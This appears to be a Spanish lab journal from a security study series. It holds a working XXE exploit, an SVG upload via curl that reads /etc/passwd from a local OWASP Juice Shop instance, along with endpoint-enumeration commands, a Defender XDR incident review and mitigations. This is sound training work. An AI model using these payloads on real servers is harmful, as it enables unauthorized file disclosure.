# Día 27 — XXE + Microsoft Defender XDR

**Fecha:** Abril 2026  
**MITRE:** T1190  
**Target:** OWASP Juice Shop

---

## Teoría

### XXE — XML External Entity Injection

XML tiene una feature llamada **entidades** — variables que el parser reemplaza antes de procesar el documento:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY nombre "Marco">
]>
<root>Hola &nombre;</root>
<!-- El parser produce: "Hola Marco" -->
```

Las **External Entities** permiten que esa variable apunte a un recurso externo — un archivo del sistema o una URL:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<root>&xxe;</root>
<!-- El parser lee /etc/passwd y lo inyecta en el XML -->
```

Si una app acepta XML del cliente y lo parsea sin deshabilitar entidades externas, el atacante controla qué lee el servidor.

**¿En dónde aparece XML en una app moderna?**

El HTML del frontend no tiene nada que ver con XXE. El XML aparece en capas que normalmente no se ven:
- APIs legacy que usan XML en lugar de JSON
- Formatos de archivo que internamente son XML: `.docx`, `.xlsx`, `.svg`
- Protocolos SOAP — bancos, gobiernos y sistemas legacy
- Endpoints que aceptan uploads de archivos XML o SVG

**¿Qué es el parser?**

Un parser es el componente que lee texto XML y lo convierte en algo que el código puede usar. El problema es que los parsers XML tienen las entidades externas activadas por default. Cuando llega un payload malicioso, el parser lo procesa fielmente — lee el archivo indicado y lo inyecta en el resultado antes de entregárselo a la app. La app nunca sabe que pasó algo malo.

**Tres tipos de ataque:**

| Tipo | Qué hace |
|------|----------|
| File Disclosure | Lee archivos del servidor (`/etc/passwd`, `web.config`) |
| SSRF via XXE | El parser hace requests HTTP internos |
| Blind XXE | No hay output visible — exfiltra datos via DNS/HTTP |

**Casos reales:**
- **Facebook (2014)** — XXE en parser de Office para leer archivos internos → bug bounty $33K
- **PayPal (2013)** — XXE vía upload de archivos XML → acceso a archivos de configuración
- **Uber (2016)** — XXE para leer `/etc/passwd` en servidor de producción

---

## Red Team

### Sección 1 — Reconocimiento del target

DVWA no tiene módulo XXE — usamos OWASP Juice Shop (puerto 3000).

**Verificar que Juice Shop está corriendo:**
```bash
curl -s -o /dev/null -w "%{http_code}" http://192.168.1.96:3000
# → 200
```

**Login como admin y obtener JWT:**
```bash
MS_TOKEN=$(curl -s -X POST "http://192.168.1.96:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
```

### Sección 2 — Enumeración de endpoints desde el JavaScript

En lugar de adivinar endpoints, extraemos las rutas directamente del bundle JS de la app — Juice Shop es una SPA en Angular y todas las rutas están hardcodeadas en el JavaScript:

```bash
curl -s http://192.168.1.96:3000/main.js | \
  grep -oE '"/rest/[^"]+"|"/api/[^"]+"|"\/[a-z]+/[^"]{3,}"' | sort -u
```

Este método es más realista que una lista estática porque encuentra endpoints que no están documentados ni expuestos en el frontend.

**Endpoints relevantes encontrados:**
```
/api/Complaints
/api/Feedbacks
/api/Users
/file-upload
/rest/memories
/rest/products
...y más
```

### Sección 3 — Identificar endpoints que aceptan XML

Probamos cada endpoint con un XML básico y analizamos los status codes:

```bash
for ep in "/rest/memories" "/api/Complaints" "/api/Feedbacks" "/rest/products" "/rest/user/login" "/api/Users" "/api/Recycles"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://192.168.1.96:3000$ep" \
    -H "Content-Type: application/xml" \
    -H "Authorization: Bearer $TOKEN" \
    -d '<?xml version="1.0"?><test></test>')
  echo "$code  $ep"
done
```

**Resultados:**
```
400  /rest/memories
201  /api/Complaints
500  /api/Feedbacks    ← servidor crasheó procesando XML
500  /rest/products    ← servidor crasheó procesando XML
401  /rest/user/login
201  /api/Users
201  /api/Recycles
```

Los `500` indican que hay un parser XML activo que intentó procesar el payload. Esto también confirmó que el challenge de XXE en Juice Shop usa el endpoint `/file-upload` — los SVG son XML y el servidor los parsea al recibirlos.

### Sección 4 — Explotación XXE via File Upload

Juice Shop acepta uploads de archivos SVG. Los SVG son XML — si el servidor los parsea sin deshabilitar entidades externas, podemos inyectar un XXE.

**Guardar el output del ataque:**
```bash
curl -s -X POST "http://192.168.1.96:3000/file-upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@-;filename=xxe.xml;type=image/svg+xml" << 'EOF' > /tmp/xxe_output.html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF
```

**Extraer el contenido del archivo:**
```bash
python3 -c "
import re, html
with open('/tmp/xxe_output.html') as f:
    content = f.read()
content = html.unescape(content)
match = re.search(r'<text>(.*?)</text>', content)
if match:
    print(match.group(1))
"
```

**Output — `/etc/passwd` del servidor:**
```
root:x:0:0:root:/root:/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin
nonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin
```

**XXE DATA ACCESS CONFIRMADO** ✅

El servidor devolvió `410 Gone` pero antes de rechazar el archivo ya parseó el XML y leyó `/etc/passwd`. El contenido quedó embebido en el mensaje de error — file disclosure exitoso.

**Análisis del output:**

| Usuario | UID | Significado |
|---------|-----|-------------|
| `root` | 0 | Superusuario — existe pero sin shell interactiva |
| `nobody` | 65534 | Usuario sin privilegios para procesos del SO |
| `nonroot` | 65532 | Usuario con el que corre Juice Shop dentro del contenedor |

Solo 3 usuarios porque estamos dentro de un contenedor Docker — filesystem aislado. En un servidor real habría 30+ usuarios.

**Resumen del flujo del ataque:**
```
1. Extraemos endpoints desde el JS de la app
2. Identificamos /file-upload como candidato (parsea SVG/XML)
3. Subimos un SVG con entidad externa: file:///etc/passwd
4. El parser XML del servidor lee el archivo antes de validar
5. El contenido aparece en el mensaje de error → file disclosure
```

---

## App MS Security — Microsoft Defender API

### Registro de aplicación en Azure AD

Se registró la app `ms-security-app` en el tenant `labmxsc200.onmicrosoft.com` para conectar el dashboard con datos reales de Microsoft Defender.

**Credenciales obtenidas:**
- **Tenant ID:** `660ff11e-270e-48e0-bc04-50e32b649b1c`
- **Client ID:** `d17093b0-21ec-498b-80d2-38ae90e4fbe6`
- **Client Secret:** generado con expiración 6 meses

**Permiso configurado:** `SecurityAlert.Read.All` (Microsoft Graph)

**Autenticación exitosa — token obtenido:**
```bash
MS_TOKEN=$(curl -s -X POST \
  "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$CLIENT_ID" \
  -d "client_secret=$CLIENT_SECRET" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

**Resultado:** Token Bearer obtenido exitosamente. El permiso `SecurityAlert.Read.All` requiere consentimiento de Global Admin — pendiente de aprobación en el tenant compartido. Se continuará en el Día 28.

---

## SC-200 — Microsoft Defender XDR: Exploración del portal

### Estructura del portal security.microsoft.com

El portal unifica **Microsoft Defender XDR + Microsoft Sentinel** en una sola interfaz. Las secciones principales:

| Sección | Producto | Relevancia SC-200 |
|---------|----------|-------------------|
| Investigación y respuesta | Defender XDR | Alta — core del examen |
| Microsoft Sentinel | Sentinel | Alta — KQL, analytics rules |
| Identidades | Defender for Identity | Media |
| Extremos | Defender for Endpoint | Alta |
| Colaboración y correo | Defender for Office 365 | Media |
| Aplicaciones en la nube | Defender for Cloud Apps | Media |

### Análisis de incidente real — ID 1

**Incidente:** *"Hands-on keyboard attack was launched from a compromised account"*

| Campo | Valor |
|-------|-------|
| Gravedad | Alto |
| Estado | Active |
| Tags | Movimiento lateral, Interrupción de ataque |
| Alertas | 12 |
| Activos afectados | 3 (1 dispositivo, 2 usuarios) |
| Duración | 14 abril 7:49 → 11:26 (3.5 horas) |
| MITRE | T1021.003, T1021.001, T1547.001 |

**Cadena de ataque reconstruida desde las 12 alertas:**
```
1. Compromised account conducting hands-on keyboard attack  🔴 Alto  → Lateral Movement
2. Potential human-operated malicious activity              🔴 Alto  → Defense Evasion
3. Potential human-operated malicious activity             🔴 Alto  → Actividad sospechosa
4. Lateral movement using RDP blocked ← INTERRUPCIÓN      ⚪ Info   → Lateral Movement
5. Malware detected during lateral movement                🟠 Medio → Lateral Movement
6. Compromised account conducting hands-on keyboard        🔴 Alto  → Lateral Movement ← INTERRUPCIÓN
7. Suspicious behavior by svchost.exe was observed         🟠 Medio → Execution + Defense Evasion
```

**Conceptos SC-200 observados en vivo:**

**Alert correlation** — Defender agrupó 12 alertas individuales en 1 incidente automáticamente porque compartían el mismo dispositivo `usuario1` y el mismo timeframe.

**Automatic Attack Disruption** — Defender bloqueó el movimiento lateral via RDP sin intervención humana. Las alertas con tag "Interrupción de ataque" indican acción automática ya ejecutada.

**Severidad dinámica** — La alerta "Lateral movement using RDP blocked" tiene gravedad **Informativo** a pesar de ser movimiento lateral. Esto es porque el ataque ya fue bloqueado — la severidad refleja el riesgo actual, no la gravedad del intento original. Cuando el riesgo desaparece, la alerta baja para evitar alert fatigue.

**Clasificación de activos por producto:**
```
Dispositivos  → Defender for Endpoint (aislar)
Usuarios      → Defender for Identity (deshabilitar)
Buzones       → Defender for Office 365 (bloquear)
Aplicaciones  → Defender for Cloud Apps (suspender)
Nube          → Defender for Cloud (remediar)
```

**Orden correcto de respuesta ante un incidente crítico:**
```
1. Aislar dispositivo        → contener el daño inmediatamente
2. Revisar Historia de ataque → entender scope y vector de entrada
3. Asignarte el incidente    → documentar responsable de la investigación
4. Resolver                  → solo cuando el scope está completamente claro
```

---

## Blue Team

### Detección XXE
- WAF con reglas que detecten `<!DOCTYPE` o `<!ENTITY` en uploads
- Logs del servidor mostrando errores de parser XML con rutas de archivo en el stack trace
- FIM (File Integrity Monitoring) en archivos sensibles como `/etc/passwd`
- Alertas en subidas de archivos SVG o XML que generan errores 4xx/5xx

### Mitigación XXE
- **Deshabilitar entidades externas en el parser** — es la mitigación más efectiva. En Node.js con `libxmljs`: `parseXml(data, { noent: false })`
- **Whitelist de tipos de archivo** — validar el contenido real del archivo, no solo la extensión
- **Principio de mínimo privilegio** — el proceso que parsea XML no debería poder leer `/etc/passwd`
- **Sandboxing** — ejecutar el parser en un entorno aislado sin acceso al filesystem del host

---

## Conclusión

XXE demostró cómo una feature legítima de XML — las entidades externas — se convierte en un vector de file disclosure cuando el parser no está configurado correctamente. El ataque no requirió credenciales especiales ni exploits complejos: bastó subir un SVG con una línea de XML malicioso para leer archivos del servidor. La metodología de reconocimiento fue más realista que en días anteriores — extrajimos los endpoints directamente del JavaScript de la app en lugar de usar una lista estática.

En la sección de SC-200 se exploró el portal de Microsoft Defender XDR analizando un incidente real de hands-on keyboard attack con movimiento lateral via RDP. Los conceptos de alert correlation, automatic attack disruption y severidad dinámica quedaron claros al verlos aplicados en un incidente activo. Se registró la app `ms-security-app` en Azure AD como primer paso para conectar el dashboard a datos reales de Defender — pendiente de consentimiento de admin para el Día 28.
